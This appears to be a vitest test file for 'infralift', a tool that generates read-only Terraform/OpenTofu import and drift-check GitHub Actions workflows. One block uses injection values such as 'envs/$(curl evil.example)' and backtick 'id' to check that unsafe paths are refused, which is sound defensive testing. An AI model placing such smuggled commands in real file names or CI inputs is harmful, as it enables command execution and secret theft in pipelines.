import { describe, expect, it } from "vitest";
import { parse } from "yaml";
import {
  checkEnv,
  checkGroups,
  checkSetupLines,
  checkWorkflowPath,
  renderImportCheck,
  secretNameFor,
} from "./check.js";
import { scanRepo } from "./scan.js";
import { DRIFT_JOB_NAME, driftJobName } from "./contract.js";

const root = (files: { path: string; content: string }[]) => scanRepo(files).roots[0];

const PROD = root([
  {
    path: "infra/prod/main.tf",
    content: `terraform {
  backend "s3" {
    bucket = "b"
    key    = "k"
  }
}
variable "db-password" {}
resource "hcloud_server" "s" {}
resource "github_repository" "r" {}
`,
  },
]);

describe("renderImportCheck", () => {
  it("plans read-only: no lock, no apply, fails on any change", () => {
    const { path, content } = renderImportCheck(PROD);
    expect(path).toBe(".github/workflows/infralift-import-infra-prod.yml");
    expect(content).toContain("terraform plan -input=false -lock=false -no-color -detailed-exitcode");
    expect(content).not.toMatch(/\bapply\b(?! nothing)(?!\.)/);
    expect(content).not.toContain("-auto-approve");
    expect(content).toContain("permissions:\n  contents: read");
    expect(parse(content).jobs.plan.defaults.run["working-directory"]).toBe("infra/prod");
    // The outcome annotations infralift reads back (lib/import/result.ts).
    expect(content).toContain('msg="No changes: all $total resources match the code."');
    expect(content).toContain('msg="$changes of $total resources would change."');
    expect(content).toContain('echo "::notice::$msg"');
    expect(content).toContain('echo "::error::$msg"');
    expect(content).toContain("    name: Plan changes nothing");
  });

  it("passes each credential and unset variable through from a secret", () => {
    const { content } = renderImportCheck(PROD);
    expect(content).toContain("HCLOUD_TOKEN: ${{ secrets.HCLOUD_TOKEN }}");
    // GitHub reserves the GITHUB_ prefix for secret names.
    expect(content).toContain("GITHUB_TOKEN: ${{ secrets.INFRALIFT_GITHUB_TOKEN }}");
    // Secret names cannot hold dashes; the env var keeps the variable's name.
    expect(content).toContain("TF_VAR_db-password: ${{ secrets.TF_VAR_db_password }}");
  });

  it("uses OpenTofu when the repository does, and its backend config file", () => {
    const tofu = root([
      { path: "main.tf", content: 'terraform {\n  backend "gcs" {}\n}\nresource "google_storage_bucket" "b" {}\n' },
      { path: "prod.tfbackend", content: 'bucket = "x"\n' },
      { path: ".opentofu-version", content: "1.8.0\n" },
    ]);
    const { path, content } = renderImportCheck(tofu, { backendConfigFile: "prod.tfbackend" });
    expect(path).toBe(".github/workflows/infralift-import-root.yml");
    expect(content).toContain("opentofu/setup-opentofu@v1");
    expect(content).toContain('tofu init -input=false -backend-config="$BACKEND_CONFIG"');
    const wf = parse(content);
    expect(wf.jobs.plan.env.BACKEND_CONFIG).toBe("prod.tfbackend");
    expect(wf.jobs.plan.defaults.run["working-directory"]).toBe(".");
    expect(wf.on.pull_request.paths).toContain("**/*.tf");
  });

  it("gives a nested module's config file relative to the module", () => {
    const nested = root([
      { path: "envs/prod/main.tf", content: 'terraform {\n  backend "s3" {}\n}\nresource "aws_s3_bucket" "b" {}\n' },
      { path: "envs/prod/backend.hcl", content: 'bucket = "x"\n' },
    ]);
    expect(parse(renderImportCheck(nested, { backendConfigFile: "envs/prod/backend.hcl" }).content).jobs.plan.env.BACKEND_CONFIG).toBe(
      "backend.hcl"
    );
  });
});

describe("paths never reach the shell as code", () => {
  const hostile = "envs/$(curl evil.example)";
  const tf = 'terraform {\n  backend "s3" {\n    bucket = "b"\n    key = "k"\n  }\n}\nresource "aws_s3_bucket" "b" {}\n';

  it("blocks a root whose directory name is not a plain path", () => {
    for (const dir of [hostile, "envs/`id`", 'envs/a"b', "envs/${{ secrets.X }}"]) {
      const r = root([{ path: `${dir}/main.tf`, content: tf }]);
      expect(r.readiness, dir).toBe("blocked");
      expect(r.notes.join(" ")).toMatch(/Rename it/);
    }
  });

  it("refuses to render for such a path even if asked directly", () => {
    const r = { ...PROD, path: hostile };
    expect(() => renderImportCheck(r)).toThrow(/refusing/);
    expect(() => renderImportCheck(PROD, { backendConfigFile: "infra/prod/$(x).hcl" })).toThrow(/refusing/);
  });

  it("names the module in the summary through an env var", () => {
    const { content } = renderImportCheck(PROD);
    expect(parse(content).jobs.plan.env.MODULE_LABEL).toBe("infra/prod");
    expect(content).toContain('echo "## infralift import check: $MODULE_LABEL"');
  });

  it("drops backend config files with unsafe names", () => {
    const r = root([
      { path: "main.tf", content: 'terraform {\n  backend "gcs" {}\n}\nresource "google_storage_bucket" "b" {}\n' },
      { path: "$(x).tfbackend", content: 'bucket = "x"\n' },
    ]);
    expect(r.backend.configFiles).toEqual([]);
    expect(r.readiness).toBe("blocked");
  });
});

describe("credentials: stored keys or OIDC", () => {
  const tfFor = (backend: string, resources: string) =>
    `terraform {\n  backend ${backend}\n}\n${resources}`;

  it("lets AWS sign in with OIDC instead of stored keys", () => {
    const aws = root([
      { path: "main.tf", content: tfFor('"s3" {\n    bucket = "b"\n    key = "k"\n  }', 'resource "aws_s3_bucket" "b" {}\n') },
    ]);
    const { content } = renderImportCheck(aws);
    expect(checkGroups(aws).map((g) => g.cloud)).toEqual(["aws"]);
    expect(content).toContain("  id-token: write");
    expect(content).toContain("if: vars.INFRALIFT_AWS_ROLE_ARN != ''");
    expect(content).toContain("uses: aws-actions/configure-aws-credentials@v4");
    expect(content).toContain("AWS_ACCESS_KEY_ID: ${{ steps.aws.outputs.aws-access-key-id || secrets.AWS_ACCESS_KEY_ID }}");
    expect(content).toContain("AWS_SESSION_TOKEN: ${{ steps.aws.outputs.aws-session-token }}");
    expect(content).toContain("OIDC_AWS: ${{ vars.INFRALIFT_AWS_ROLE_ARN != '' }}");
    // Credentials live on the steps that use them, not at job level, where
    // they would override the OIDC session.
    expect(content.split("    steps:")[0]).not.toContain("AWS_ACCESS_KEY_ID");
  });

  it("lets Google Cloud and Azure sign in with OIDC", () => {
    const multi = root([
      {
        path: "main.tf",
        content: tfFor('"gcs" {\n    bucket = "b"\n  }', 'resource "google_storage_bucket" "b" {}\nresource "azurerm_resource_group" "g" {}\n'),
      },
    ]);
    const { content } = renderImportCheck(multi);
    expect(checkGroups(multi).map((g) => g.cloud)).toEqual(["gcp", "azure"]);
    expect(content).toContain("uses: google-github-actions/auth@v2");
    expect(content).toContain("ARM_CLIENT_ID: ${{ secrets.ARM_CLIENT_ID || vars.INFRALIFT_AZURE_CLIENT_ID }}");
    // Same condition as the credentials check: all three variables.
    expect(content).toContain(
      "ARM_USE_OIDC: ${{ vars.INFRALIFT_AZURE_CLIENT_ID != '' && vars.INFRALIFT_AZURE_TENANT_ID != '' && vars.INFRALIFT_AZURE_SUBSCRIPTION_ID != '' && secrets.ARM_CLIENT_SECRET == '' }}"
    );
    expect(content).toContain(
      "if: vars.INFRALIFT_GCP_WORKLOAD_IDENTITY_PROVIDER != '' && vars.INFRALIFT_GCP_SERVICE_ACCOUNT != ''"
    );
    expect(checkSetupLines(multi).join("\n")).toMatch(/Azure: secrets .* or for OIDC with no stored key, repository variables/);
  });

  it("hands R2 keys to init only, so an aws provider keeps AWS credentials", () => {
    const both = root([
      {
        path: "main.tf",
        content: tfFor(
          '"s3" {\n    bucket = "b"\n    key = "k"\n    endpoints = { s3 = "https://x.r2.cloudflarestorage.com" }\n  }',
          'resource "aws_s3_bucket" "b" {}\n'
        ),
      },
    ]);
    const { content } = renderImportCheck(both);
    expect(content).toContain('init -input=false -backend-config="access_key=$R2_ACCESS_KEY_ID" -backend-config="secret_key=$R2_SECRET_ACCESS_KEY"');
    expect(content).toContain("R2_ACCESS_KEY_ID: ${{ secrets.R2_ACCESS_KEY_ID }}");
    expect(content).toContain("AWS_ACCESS_KEY_ID: ${{ steps.aws.outputs.aws-access-key-id || secrets.AWS_ACCESS_KEY_ID }}");
  });

  it("asks for no id-token permission when no cloud can use OIDC", () => {
    const { content } = renderImportCheck(
      root([{ path: "main.tf", content: tfFor('"gcs" {\n    bucket = "b"\n  }', "") + 'resource "hcloud_server" "s" {}\n' }])
    );
    // gcs backend brings in Google credentials, so this one does ask.
    expect(content).toContain("id-token: write");
    const plain = renderImportCheck({ ...PROD, credentials: ["HCLOUD_TOKEN"], requiredVariables: [] }).content;
    expect(plain).not.toContain("id-token");
  });

  it("refuses an env name it cannot write safely", () => {
    expect(() => checkEnv({ ...PROD, requiredVariables: ["x: ${{ secrets.A }} #"] })).toThrow(/refusing/);
  });
});

describe("check helpers", () => {
  it("names secrets GitHub will accept", () => {
    expect(secretNameFor("HCLOUD_TOKEN")).toBe("HCLOUD_TOKEN");
    expect(secretNameFor("GITHUB_TOKEN")).toBe("INFRALIFT_GITHUB_TOKEN");
    expect(secretNameFor("TF_VAR_a-b")).toBe("TF_VAR_a_b");
  });

  it("lists credentials before variables", () => {
    expect(checkEnv(PROD).map((e) => e.env)).toEqual([
      "AWS_ACCESS_KEY_ID",
      "AWS_SECRET_ACCESS_KEY",
      "GITHUB_TOKEN",
      "HCLOUD_TOKEN",
      "TF_VAR_db-password",
    ]);
  });

  it("slugs the workflow file by module path", () => {
    expect(checkWorkflowPath("")).toBe(".github/workflows/infralift-import-root.yml");
    expect(checkWorkflowPath("Envs/Prod_EU")).toBe(".github/workflows/infralift-import-envs-prod-eu.yml");
  });
});

describe("the daily drift job", () => {
  const steps = (job: { steps: { run?: string; uses?: string; if?: string; name?: string }[] }) => job.steps;

  it("runs on a schedule and on dispatch, separate from the pull request check", () => {
    const wf = parse(renderImportCheck(PROD).content);
    expect(wf.on.schedule).toEqual([{ cron: "23 6 * * *" }]);
    expect(wf.on.schedule[0].cron.split(" ")[0]).not.toBe("0");
    expect(wf.on).toHaveProperty("workflow_dispatch");
    // Per module: several imported modules' runs land on one commit.
    expect(wf.jobs.drift.name).toBe(driftJobName("infra-prod"));
    expect(wf.jobs.drift.name).toBe("infra drift: infra-prod");
    expect(wf.jobs.drift.name).not.toBe(DRIFT_JOB_NAME);
    expect(wf.jobs.drift.name).not.toBe(wf.jobs.plan.name);
    expect(wf.jobs.drift.if).toContain("github.event_name == 'schedule'");
    expect(wf.jobs.drift.if).toContain("github.event.repository.default_branch");
    // The pull request check never runs on the schedule.
    expect(wf.jobs.plan.if).toBe("github.event_name != 'schedule'");
  });

  it("plans only: no apply, no commit, no upload, a read-only token", () => {
    // Generating code is the job that commits; the drift job must not.
    const gen = { ...PROD, generateConfig: true };
    const wf = parse(renderImportCheck(gen).content);
    expect(wf.permissions.contents).toBe("write");
    const drift = wf.jobs.drift;
    expect(drift.permissions.contents).toBe("read");
    expect(drift.permissions).not.toHaveProperty("checks");
    const runs = steps(drift).map((s) => s.run ?? "").join("\n");
    const uses = steps(drift).map((s) => s.uses ?? "");
    expect(runs).toContain("terraform plan -input=false -lock=false -no-color -detailed-exitcode");
    expect(runs).not.toMatch(/\b(terraform|tofu) apply\b|-auto-approve|git push|git commit|check-runs|generate-config-out/);
    expect(uses.filter((u) => u.includes("upload-artifact"))).toEqual([]);
    expect(uses[0]).toBe("actions/checkout@v4");
    expect(steps(drift)[0]).not.toHaveProperty("with");
    // Its annotations are the ones the drift sweep reads.
    expect(runs).toContain('msg="No changes: all $total resources match the code."');
    expect(runs).toContain('msg="$changes of $total resources would change."');
    expect(runs).toContain('echo "## infralift drift check: $MODULE_LABEL"');
    // The pull request job is unchanged: it still generates and commits.
    expect(steps(wf.jobs.plan).map((s) => s.name)).toContain("Commit the generated code");
  });

  it("can sign in with OIDC when the module needs a cloud", () => {
    const aws = root([
      { path: "main.tf", content: 'terraform {\n  backend "s3" {\n    bucket = "b"\n    key = "k"\n  }\n}\nresource "aws_s3_bucket" "b" {}\n' },
    ]);
    const wf = parse(renderImportCheck(aws).content);
    expect(wf.jobs.drift.permissions).toEqual({ contents: "read", "id-token": "write" });
    expect(steps(wf.jobs.drift).some((s) => s.uses === "aws-actions/configure-aws-credentials@v4")).toBe(true);
  });
});
